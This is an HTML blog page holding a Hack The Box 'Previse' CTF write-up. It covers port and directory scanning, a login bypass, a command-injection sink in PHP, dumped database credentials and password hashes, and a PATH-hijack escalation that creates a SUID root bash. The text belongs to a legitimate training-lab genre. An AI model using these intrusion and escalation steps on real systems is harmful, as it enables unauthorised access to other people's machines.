<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>Hack The Box - Previse writeup | Hakune Blog</title>
<meta name=keywords content="ctf,tech,english">
<meta name=description content="A writeup for Hack The Box - Previse machine">
<meta name=author content="Aki Hakune">
<link rel=canonical href=https://git-akihakune.github.io/blog/previse/>
<link crossorigin=anonymous href=/assets/css/stylesheet.min.c88963fe2d79462000fd0fb1b3737783c32855d340583e4523343f8735c787f0.css integrity="sha256-yIlj/i15RiAA/Q+xs3N3g8MoVdNAWD5FIzQ/hzXHh/A=" rel="preload stylesheet" as=style>
<link rel=preload href=/static/banner.png as=image>
<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://git-akihakune.github.io/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://git-akihakune.github.io/favicon.ico>
<link rel=icon type=image/png sizes=32x32 href=https://git-akihakune.github.io/favicon.ico>
<link rel=apple-touch-icon href=https://git-akihakune.github.io/favicon.ico>
<link rel=mask-icon href=https://git-akihakune.github.io/favicon.ico>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.90.1">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
</noscript><link rel=manifest href=/hakune.webmanifest>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-F8M24PKNWZ"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-F8M24PKNWZ',{anonymize_ip:!1})}</script>
<meta property="og:title" content="Hack The Box - Previse writeup">
<meta property="og:description" content="A writeup for Hack The Box - Previse machine">
<meta property="og:type" content="article">
<meta property="og:url" content="https://git-akihakune.github.io/blog/previse/">
<meta property="og:image" content="https://git-akihakune.github.io/img/previse/previse.jpeg"><meta property="article:section" content="blog">
<meta property="article:published_time" content="2021-12-11T06:41:15+07:00">
<meta property="article:modified_time" content="2021-12-11T06:41:15+07:00"><meta property="og:site_name" content="Hakune Blog">
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="https://git-akihakune.github.io/img/previse/previse.jpeg">
<meta name=twitter:title content="Hack The Box - Previse writeup">
<meta name=twitter:description content="A writeup for Hack The Box - Previse machine">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Blogs","item":"https://git-akihakune.github.io/blog/"},{"@type":"ListItem","position":3,"name":"Hack The Box - Previse writeup","item":"https://git-akihakune.github.io/blog/previse/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Hack The Box - Previse writeup","name":"Hack The Box - Previse writeup","description":"A writeup for Hack The Box - Previse machine","keywords":["ctf","tech","english"],"articleBody":"I. Foothold It all began with a port scan:\n# Nmap 7.92 scan initiated Mon Dec 6 22:10:41 2021 as: nmap -sC -sV -oN nmap.txt 10.10.11.104 Nmap scan report for 10.10.11.104 Host is up (0.64s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http? | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | http-title: Previse Login |_Requested resource was login.php Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Dec 6 22:13:13 2021 -- 1 IP address (1 host up) scanned in 151.40 seconds I also ran a quick RustScan and set up a background nmap full ports scan, but seems like those 2 are the only ports opening. Also, since their version seems up-to-date (at the time of writing), looks like thereâ€™s no better attack vector than the web application.\nWeâ€™re greeted with this basic login form upon opening it in a web browser.\nTo be honest, the first time I got there, someoneâ€™d already pwned the system, and I easily managed to login using admin:admin. Not until Iâ€™d got the box and getting round to write this writeup that I belatedly realized: hell, it should not have been that straight-forward. So it took me about half an hour more to figure out the proper way to log in.\nChecking browserâ€™s DevTool, we can clearly see that it just simply redirect us to login page if weâ€™re not logged in.\nSo I fired up Burp Suite, intercepted the responses, change status from 302 Redirect to 200 OK, and I got in.\nAround this time, Gobuster returned with quite positive results:\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/ctf/htb/Previse] â””â”€$ gobuster dir -x php -u http://10.10.11.104 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.104 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: php [+] Timeout: 10s =============================================================== 2021/12/07 23:13:31 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 302) [Size: 2801] [-- login.php] /download.php (Status: 302) [Size: 0] [-- login.php] /login.php (Status: 200) [Size: 2224] /files.php (Status: 302) [Size: 4914] [-- login.php] /header.php (Status: 200) [Size: 980] /nav.php (Status: 200) [Size: 1248] /footer.php (Status: 200) [Size: 217] ... I manually checked all Status: 200 pages, and nav.php looked really promising.\nI reckoned thatâ€™s to render the navigation bar, along with header.php and footer.php.\nUsing the same Burp Suite technique, I got to Account and create an account of myself (later I realized that I didnâ€™t need to, and shouldnâ€™t have done that, since itâ€™ll leave traces in the database, and in real-world scenarios, getting caught like that is not good).\nAfter logged in, we can download uploaded files of other users. And an user uploaded something that looks like the source code of this web app.\nBefore reading any further, you can try to grab the source code, and try to figure out the vulnerability by yourself!\nâ€¦\nHave you done that? Whatâ€™s the vulnerability? How long did it take?\nI reckon we all got the database credentials in config.php pretty quick:\nphp function connectDB(){ $host = 'localhost'; $user = 'root'; $passwd = 'mySQL_p@ssw0rd!:)'; $db = 'previse'; $mycon = new mysqli($host, $user, $passwd, $db); return $mycon; } ?However, it took me half an hour to stumble upon this line in logs.php:\n$output = exec(\"/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}\"); With no validation whatsover, thereâ€™s a great chance that itâ€™s a command execution vulnerability via POST request.\nAnd so, I got back to Burp Suite, intercepted the request, sent it to repeater, trial and error (I mean, a lot of attempts), and finally got a reverse shell back.\nAs expected, the reverse shell returned was owned by www-data which didnâ€™t provide much privilege. However, since weâ€™d already had the MySQL database credentials, itâ€™s not hard to get all the password hashes.\n+----+------------+------------------------------------+ | id | username | password | +----+------------+------------------------------------+ | 1 | m4lwhere | $1$ðŸ§‚llol$DQpmdvnb7EeuO6UaqRItf. | | 2 | ouiouioui | $1$ðŸ§‚llol$bwR0QWQ73nPRaUpx0r2la1 | | 3 | cacapipi | $1$ðŸ§‚llol$oQSn/sA4G3L1zmOigOBq6. | | 4 | peter | $1$ðŸ§‚llol$.nhVJJDzQaIk8znez4dDH/ | | 5 | jappoo | $1$ðŸ§‚llol$JeN.ad9Ib9Gi/B.zMvpEm/ | | 6 | hacker | $1$ðŸ§‚llol$MHiYle9peb0qOKtGJWZ9S0 | | 7 | noobie | $1$ðŸ§‚llol$QJyUxlZ0gphAKveVeBYGk. | | 8 | fignupafya | $1$ðŸ§‚llol$sP8qi2I.K6urjPuzdGizl1 | | 9 | lmaolmao | $1$ðŸ§‚llol$bT7q8rEMWewT0sa2T6FOx0 | +----+------------+------------------------------------+ Also, take a look at /etc/passwd, we have:\nroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin m4lwhere:x:1000:1000:m4lwhere:/home/m4lwhere:/bin/bash mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false So our target should be m4lwhere user.\nAt this point, letâ€™s just run John the Ripper (which I personally prefer over Hashcat, since configuring hardware things for hashcat in a virtual environment is quite daunting), and weâ€™d got m4lwhere password.\nII. Privilege Escalation Logging in SSH with the credentials of m4lwhere, weâ€™d got the user flag. Now itâ€™s time for vertical privilege escalation!\nAfter some basic recons, this looks like the best shot we could have:\nm4lwhere@previse:~$ sudo -l [sudo] password for m4lwhere: User m4lwhere may run the following commands on previse: (root) /opt/scripts/access_backup.sh So letâ€™s go for it!\nm4lwhere@previse:~$ cat /opt/scripts/access_backup.sh #!/bin/bash # We always make sure to store logs, we take security SERIOUSLY here # I know I shouldnt run this as root but I cant figure it out programmatically on my account # This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time gzip -c /var/log/apache2/access.log  /var/backups/$(date --date=\"yesterday\" +%Y%b%d)_access.gz gzip -c /var/www/file_access.log  /var/backups/$(date --date=\"yesterday\" +%Y%b%d)_file_access.gz Can you spot the vulnerability? Are we seeing eye to eye, or looking at different things? :D\nIâ€™ve to admit, at first, I digged deep into the date hole. date binary can provide file read access, so I struggled to change the system date to my payload, without-root-access. It was pure hell. After giving up on it, I took another look at access_backup.sh and, god, why was I so blind about that relative gzip? What about path injection?\nAt first, I tried to directly execute /bin/bash through that injection, but it didnâ€™t work. So I tried a a workaround.\nI copied bash to home, made a bash script that set SUID and change user of that binary, change PATH to inject it, and got root. Hereâ€™s the script.\n#!/usr/bin/bash chown root:root bash chmod +s bash The whole process can be described as:\nm4lwhere@previse:~$ cp /bin/bash ~ m4lwhere@previse:~$ mv script.sh ~/gzip m4lwhere@previse:~$ export $PATH=/home/m4lwhere:$PATH m4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh m4lwhere@previse:~$ bash -p root@previse:/home/m4lwhere$ And thatâ€™s it. The root flag! Donâ€™t forget to clean up your traces, for practicing purposes and for later players, everyone. :D\n","wordCount":"1155","inLanguage":"en","image":"https://git-akihakune.github.io/img/previse/previse.jpeg","datePublished":"2021-12-11T06:41:15+07:00","dateModified":"2021-12-11T06:41:15+07:00","author":[{"@type":"Person","name":"Aki Hakune"}],"mainEntityOfPage":{"@type":"WebPage","@id":"https://git-akihakune.github.io/blog/previse/"},"publisher":{"@type":"Organization","name":"Hakune Blog","logo":{"@type":"ImageObject","url":"https://git-akihakune.github.io/favicon.ico"}}}</script>
</head>
<body class=dark id=top>
<script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove('dark')</script>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://git-akihakune.github.io accesskey=h title="Blog (Alt + H)">
<img src=/static/banner.png alt=logo aria-label=logo height=40>Blog</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</span>
</div>
<ul id=menu>
<li>
<a href=https://git-akihakune.github.io/archive/ title=archive>
<span>archive</span>
</a>
</li>
<li>
<a href=https://git-akihakune.github.io/blog/ title=blog>
<span>blog</span>
</a>
</li>
<li>
<a href=https://git-akihakune.github.io/search/ title="search (Alt + /)" accesskey=/>
<span>search</span>
</a>
</li>
<li>
<a href=https://git-akihakune.github.io/tags/ title=tags>
<span>tags</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://git-akihakune.github.io>Home</a>&nbsp;Â»&nbsp;<a href=https://git-akihakune.github.io/blog/>Blogs</a></div>
<h1 class=post-title>
Hack The Box - Previse writeup
</h1>
<div class=post-meta><span title="2021-12-11 06:41:15 +0700 +07">December 11, 2021</span>&nbsp;Â·&nbsp;6 min&nbsp;Â·&nbsp;Aki Hakune&nbsp;|&nbsp;<a href=https://github.com/git-akihakune/git-akihakune.github.io/tree/main/ rel="noopener noreferrer" target=_blank>Suggest Changes</a>
</div>
</header>
<figure class=entry-cover><img loading=lazy src=https://git-akihakune.github.io/img/previse/previse.jpeg alt="Hack The Box - Previse">
<p>Hack The Box - Previse</p>
</figure><div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<span class=details>Table of Contents</span>
</summary>
<div class=inner><ul>
<li>
<a href=#i-foothold aria-label="I. Foothold">I. Foothold</a></li>
<li>
<a href=#ii-privilege-escalation aria-label="II. Privilege Escalation">II. Privilege Escalation</a>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content><h2 id=i-foothold>I. Foothold<a hidden class=anchor aria-hidden=true href=#i-foothold>#</a></h2>
<p>It all began with a port scan:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># Nmap 7.92 scan initiated Mon Dec  6 22:10:41 2021 as: nmap -sC -sV -oN nmap.txt 10.10.11.104</span>
Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.104
Host is up <span style=color:#f92672>(</span>0.64s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>998</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
| ssh-hostkey: 
|   <span style=color:#ae81ff>2048</span> 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
|   <span style=color:#ae81ff>256</span> bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
|_  <span style=color:#ae81ff>256</span> 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
80/tcp open  http?
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style=color:#75715e># Nmap done at Mon Dec  6 22:13:13 2021 -- 1 IP address (1 host up) scanned in 151.40 seconds</span>
</code></pre></div><p>I also ran a quick <code>RustScan</code> and set up a background <code>nmap</code> full ports scan, but seems like those 2 are the only ports opening. Also, since their version seems up-to-date (at the time of writing), looks like there&rsquo;s no better attack vector than the web application.</p>
<p><img loading=lazy src=/img/previse/login.png#center alt>
</p>
<p>We&rsquo;re greeted with this basic login form upon opening it in a web browser.</p>
<p>To be honest, the first time I got there, someone&rsquo;d already pwned the system, and I easily managed to login using <code>admin:admin</code>. Not until I&rsquo;d got the box and getting round to write this writeup that I belatedly realized: hell, it should not have been that straight-forward. So it took me about half an hour more to figure out the proper way to log in.</p>
<p>Checking browser&rsquo;s DevTool, we can clearly see that it just simply redirect us to <code>login</code> page if we&rsquo;re not logged in.</p>
<p>So I fired up Burp Suite, intercepted the responses, change status from <code>302 Redirect</code> to <code>200 OK</code>, and I got in.</p>
<p>Around this time, Gobuster returned with quite positive results:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>â”Œâ”€â”€<span style=color:#f92672>(</span>kaliã‰¿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/ctf/htb/Previse<span style=color:#f92672>]</span>
â””â”€$ gobuster dir -x php -u http://10.10.11.104 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
<span style=color:#f92672>===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>
<span style=color:#f92672>===============================================================</span>
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:                     http://10.10.11.104
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:                  GET
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:                 <span style=color:#ae81ff>10</span>
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Negative Status codes:   <span style=color:#ae81ff>404</span>
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:              gobuster/3.1.0
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Extensions:              php
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:                 10s
<span style=color:#f92672>===============================================================</span>
2021/12/07 23:13:31 Starting gobuster in directory enumeration mode
<span style=color:#f92672>===============================================================</span>
/index.php            <span style=color:#f92672>(</span>Status: 302<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 2801<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; login.php<span style=color:#f92672>]</span>
/download.php         <span style=color:#f92672>(</span>Status: 302<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 0<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; login.php<span style=color:#f92672>]</span>   
/login.php            <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 2224<span style=color:#f92672>]</span>                
/files.php            <span style=color:#f92672>(</span>Status: 302<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 4914<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; login.php<span style=color:#f92672>]</span>
/header.php           <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 980<span style=color:#f92672>]</span>                 
/nav.php              <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 1248<span style=color:#f92672>]</span>                
/footer.php           <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 217<span style=color:#f92672>]</span>   
...
</code></pre></div><p>I manually checked all <code>Status: 200</code> pages, and <code>nav.php</code> looked really promising.</p>
<p><img loading=lazy src=/img/previse/nav.png#center alt>
</p>
<p>I reckoned that&rsquo;s to render the navigation bar, along with <code>header.php</code> and <code>footer.php</code>.</p>
<p>Using the same Burp Suite technique, I got to <code>Account</code> and create an account of myself (later I realized that I didn&rsquo;t need to, and shouldn&rsquo;t have done that, since it&rsquo;ll leave traces in the database, and in real-world scenarios, getting caught like that is not good).</p>
<p>After logged in, we can download uploaded files of other users. And an user uploaded something that looks like <a href=/data/previse/siteBackup.zip>the source code of this web app</a>.</p>
<p>Before reading any further, you can try to grab the source code, and try to figure out the vulnerability by yourself!</p>
<p>&mldr;</p>
<p>Have you done that? What&rsquo;s the vulnerability? How long did it take?</p>
<p>I reckon we all got the database credentials in <code>config.php</code> pretty quick:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>

<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>connectDB</span>(){
    $host <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;localhost&#39;</span>;
    $user <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;root&#39;</span>;
    $passwd <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;mySQL_p@ssw0rd!:)&#39;</span>;
    $db <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;previse&#39;</span>;
    $mycon <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>mysqli</span>($host, $user, $passwd, $db);
    <span style=color:#66d9ef>return</span> $mycon;
}

<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></code></pre></div><p>However, it took me half an hour to stumble upon this line in <code>logs.php</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php>$output <span style=color:#f92672>=</span> <span style=color:#a6e22e>exec</span>(<span style=color:#e6db74>&#34;/usr/bin/python /opt/scripts/log_process.py </span><span style=color:#e6db74>{</span>$_POST[<span style=color:#e6db74>&#39;delim&#39;</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>);
</code></pre></div><p>With no validation whatsover, there&rsquo;s a great chance that it&rsquo;s a command execution vulnerability via POST request.</p>
<p>And so, I got back to Burp Suite, intercepted the request, sent it to repeater, trial and error (I mean, a lot of attempts), and finally got a reverse shell back.</p>
<p>As expected, the reverse shell returned was owned by <code>www-data</code> which didn&rsquo;t provide much privilege. However, since we&rsquo;d already had the MySQL database credentials, it&rsquo;s not hard to get all the password hashes.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=color:#f92672>+</span><span style=color:#75715e>----+------------+------------------------------------+
</span><span style=color:#75715e></span><span style=color:#f92672>|</span> id <span style=color:#f92672>|</span> username   <span style=color:#f92672>|</span> password                           <span style=color:#f92672>|</span>
<span style=color:#f92672>+</span><span style=color:#75715e>----+------------+------------------------------------+
</span><span style=color:#75715e></span><span style=color:#f92672>|</span>  <span style=color:#ae81ff>1</span> <span style=color:#f92672>|</span> m4lwhere   <span style=color:#f92672>|</span> <span style=color:#960050;background-color:#1e0010>$</span><span style=color:#ae81ff>1</span><span style=color:#960050;background-color:#1e0010>$ðŸ§‚</span>llol$DQpmdvnb7EeuO6UaqRItf. <span style=color:#f92672>|</span>
<span style=color:#f92672>|</span>  <span style=color:#ae81ff>2</span> <span style=color:#f92672>|</span> ouiouioui  <span style=color:#f92672>|</span> <span style=color:#960050;background-color:#1e0010>$</span><span style=color:#ae81ff>1</span><span style=color:#960050;background-color:#1e0010>$ðŸ§‚</span>llol$bwR0QWQ73nPRaUpx0r2la1 <span style=color:#f92672>|</span>
<span style=color:#f92672>|</span>  <span style=color:#ae81ff>3</span> <span style=color:#f92672>|</span> cacapipi   <span style=color:#f92672>|</span> <span style=color:#960050;background-color:#1e0010>$</span><span style=color:#ae81ff>1</span><span style=color:#960050;background-color:#1e0010>$ðŸ§‚</span>llol$oQSn<span style=color:#f92672>/</span>sA4G3L1zmOigOBq6. <span style=color:#f92672>|</span>
<span style=color:#f92672>|</span>  <span style=color:#ae81ff>4</span> <span style=color:#f92672>|</span> peter      <span style=color:#f92672>|</span> <span style=color:#960050;background-color:#1e0010>$</span><span style=color:#ae81ff>1</span><span style=color:#960050;background-color:#1e0010>$ðŸ§‚</span>llol$.nhVJJDzQaIk8znez4dDH<span style=color:#f92672>/</span> <span style=color:#f92672>|</span>
<span style=color:#f92672>|</span>  <span style=color:#ae81ff>5</span> <span style=color:#f92672>|</span> jappoo     <span style=color:#f92672>|</span> <span style=color:#960050;background-color:#1e0010>$</span><span style=color:#ae81ff>1</span><span style=color:#960050;background-color:#1e0010>$ðŸ§‚</span>llol$JeN.ad9Ib9Gi<span style=color:#f92672>/</span>B.zMvpEm<span style=color:#f92672>/</span> <span style=color:#f92672>|</span>
<span style=color:#f92672>|</span>  <span style=color:#ae81ff>6</span> <span style=color:#f92672>|</span> hacker     <span style=color:#f92672>|</span> <span style=color:#960050;background-color:#1e0010>$</span><span style=color:#ae81ff>1</span><span style=color:#960050;background-color:#1e0010>$ðŸ§‚</span>llol$MHiYle9peb0qOKtGJWZ9S0 <span style=color:#f92672>|</span>
<span style=color:#f92672>|</span>  <span style=color:#ae81ff>7</span> <span style=color:#f92672>|</span> noobie     <span style=color:#f92672>|</span> <span style=color:#960050;background-color:#1e0010>$</span><span style=color:#ae81ff>1</span><span style=color:#960050;background-color:#1e0010>$ðŸ§‚</span>llol$QJyUxlZ0gphAKveVeBYGk. <span style=color:#f92672>|</span>
<span style=color:#f92672>|</span>  <span style=color:#ae81ff>8</span> <span style=color:#f92672>|</span> fignupafya <span style=color:#f92672>|</span> <span style=color:#960050;background-color:#1e0010>$</span><span style=color:#ae81ff>1</span><span style=color:#960050;background-color:#1e0010>$ðŸ§‚</span>llol$sP8qi2I.K6urjPuzdGizl1 <span style=color:#f92672>|</span>
<span style=color:#f92672>|</span>  <span style=color:#ae81ff>9</span> <span style=color:#f92672>|</span> lmaolmao   <span style=color:#f92672>|</span> <span style=color:#960050;background-color:#1e0010>$</span><span style=color:#ae81ff>1</span><span style=color:#960050;background-color:#1e0010>$ðŸ§‚</span>llol$bT7q8rEMWewT0sa2T6FOx0 <span style=color:#f92672>|</span>
<span style=color:#f92672>+</span><span style=color:#75715e>----+------------+------------------------------------+
</span></code></pre></div><p>Also, take a look at <code>/etc/passwd</code>, we have:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System <span style=color:#f92672>(</span>admin<span style=color:#f92672>)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
